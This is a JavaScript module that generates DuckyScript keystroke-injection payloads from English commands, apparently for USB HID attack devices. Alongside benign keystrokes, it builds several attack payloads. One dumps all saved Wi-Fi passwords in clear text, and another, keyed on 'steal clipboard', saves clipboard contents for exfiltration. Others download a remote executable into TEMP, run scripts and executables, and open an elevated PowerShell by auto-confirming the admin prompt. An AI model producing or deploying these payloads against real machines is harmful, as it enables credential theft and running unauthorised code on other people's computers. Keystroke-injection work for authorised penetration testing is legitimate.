/*
 * PayloadGen.cjs
 * 
 * Takes natural language commands and spits out DuckyScript.
 * Uses keyword matching - not fancy ML, just good old regex and arrays.
 * 
 * Example: "open cmd and ping google" -> GUI r, STRING cmd, STRING ping google...
 * 
 * It's not perfect, but it handles the most common ops pretty well.
 */

// each intent has keywords to match and a function to generate the payload
const INTENTS = {
    OPEN_CMD: {
        keywords: ['cmd', 'command prompt', 'terminal', 'shell'],
        aliases: ['open', 'launch', 'start', 'run', 'execute'],
        generate: () => `DELAY 500
GUI r
DELAY 300
STRING cmd
ENTER
DELAY 1000
`,
    },

    OPEN_POWERSHELL: {
        keywords: ['powershell', 'ps', 'pwsh'],
        aliases: ['open', 'launch', 'start', 'run'],
        generate: () => `DELAY 500
GUI r
DELAY 300
STRING powershell
ENTER
DELAY 1000
`,
    },

    OPEN_POWERSHELL_ADMIN: {
        keywords: ['admin powershell', 'elevated powershell', 'powershell as admin'],
        aliases: ['open', 'launch', 'run'],
        generate: () => `DELAY 500
GUI x
DELAY 300
STRING a
DELAY 500
ALT y
DELAY 1000
`,
    },

    PING: {
        pattern: /ping\s+([a-zA-Z0-9.-]+)/i,
        generate: (match) => `STRING ping ${match[1]}
ENTER
`,
    },

    IPCONFIG: {
        keywords: ['ipconfig', 'ip config', 'show ip', 'get ip', 'my ip'],
        generate: () => `STRING ipconfig /all
ENTER
`,
    },

    DOWNLOAD_FILE: {
        pattern: /download\s+(?:file\s+from\s+)?(.+?)(?:\s+to\s+(.+))?$/i,
        generate: (match) => {
            const url = match[1].trim();
            const savePath = match[2] ? match[2].trim() : '$env:TEMP\\downloaded.exe';
            return `STRING powershell -Command "Invoke-WebRequest -Uri '${url}' -OutFile '${savePath}'"
ENTER
`;
        },
    },

    RUN_SCRIPT: {
        pattern: /(?:run|execute)\s+(?:script\s+)?(.+\.(?:ps1|bat|cmd|exe))/i,
        generate: (match) => `STRING ${match[1]}
ENTER
`,
    },

    OPEN_URL: {
        pattern: /(?:go to|open|visit|browse)\s+(https?:\/\/[^\s]+|www\.[^\s]+|[a-z0-9.-]+\.[a-z]{2,})/i,
        generate: (match) => `DELAY 500
GUI r
DELAY 300
STRING ${match[1]}
ENTER
`,
    },

    TYPE_TEXT: {
        pattern: /(?:type|write|input)\s+[\"']?(.+?)[\"']?$/i,
        generate: (match) => `STRING ${match[1]}
`,
    },

    PRESS_ENTER: {
        keywords: ['press enter', 'hit enter', 'submit', 'confirm'],
        generate: () => `ENTER
`,
    },

    PRESS_TAB: {
        keywords: ['press tab', 'hit tab', 'next field'],
        generate: () => `TAB
`,
    },

    WAIT: {
        pattern: /(?:wait|delay|pause)\s+(\d+)\s*(?:seconds?|sec|s|ms)?/i,
        generate: (match) => {
            const value = parseInt(match[1]);
            // small numbers are probably seconds, big ones are ms
            const ms = value < 50 ? value * 1000 : value;
            return `DELAY ${ms}
`;
        },
    },

    LOCK_SCREEN: {
        keywords: ['lock screen', 'lock computer', 'lock pc', 'lock workstation'],
        generate: () => `GUI l
`,
    },

    SCREENSHOT: {
        keywords: ['take screenshot', 'screenshot', 'capture screen', 'print screen'],
        generate: () => `PRINTSCREEN
`,
    },

    WIFI_PASSWORD: {
        keywords: ['wifi password', 'show wifi', 'get wifi password', 'export wifi'],
        generate: () => `STRING netsh wlan show profiles | findstr "All User Profile" && for /f "tokens=2 delims=:" %a in ('netsh wlan show profiles ^| findstr "All User Profile"') do @netsh wlan show profile name=%a key=clear
ENTER
`,
    },

    EXFIL_CLIPBOARD: {
        keywords: ['exfil clipboard', 'steal clipboard', 'get clipboard'],
        generate: () => `STRING powershell -Command "Get-Clipboard | Out-File -FilePath $env:TEMP\\clip.txt"
ENTER
`,
    },
};

// check if input matches an intent
function matchesIntent(text, intent) {
    const lower = text.toLowerCase();

    // regex patterns have priority
    if (intent.pattern) {
        const match = lower.match(intent.pattern);
        if (match) return { matched: true, match };
    }

    // keyword + alias matching
    if (intent.keywords && intent.keywords.length > 0) {
        const hasKeyword = intent.keywords.some(kw => lower.includes(kw));

        if (hasKeyword) {
            // if aliases exist, require at least one
            if (intent.aliases && intent.aliases.length > 0) {
                const hasAlias = intent.aliases.some(alias => lower.includes(alias));
                if (hasAlias) return { matched: true };
            } else {
                // no aliases needed
                return { matched: true };
            }
        }
    }

    return { matched: false };
}

const PayloadGen = {
    // main entry point - give it english, get back duckyscript
    generate(text) {
        if (!text || typeof text !== 'string') return '';

        let script = '';

        // check each intent
        for (const [name, intent] of Object.entries(INTENTS)) {
            const result = matchesIntent(text, intent);
            if (result.matched) {
                script += intent.generate(result.match || []);
            }
        }

        // if nothing matched, at least acknowledge the input
        if (!script) {
            if (/^[a-z]+\s/i.test(text.trim())) {
                script = `REM couldn't parse this, running as-is:
STRING ${text}
ENTER
`;
            } else {
                script = `REM no idea what "${text}" means
`;
            }
        }

        return script.trim();
    },

    // for autocomplete dropdowns
    getAvailableIntents() {
        return Object.keys(INTENTS);
    },

    // help text examples
    getExamples() {
        return {
            'Open CMD': 'open command prompt',
            'Open PowerShell': 'launch powershell',
            'Admin PowerShell': 'open admin powershell',
            'Ping Host': 'ping google.com',
            'IP Config': 'show ip config',
            'Download File': 'download https://example.com/file.exe',
            'Open URL': 'go to https://google.com',
            'Type Text': 'type hello world',
            'Wait': 'wait 5 seconds',
            'Lock Screen': 'lock computer',
            'Screenshot': 'take screenshot',
            'WiFi Passwords': 'show wifi password',
        };
    },
};

module.exports = PayloadGen;
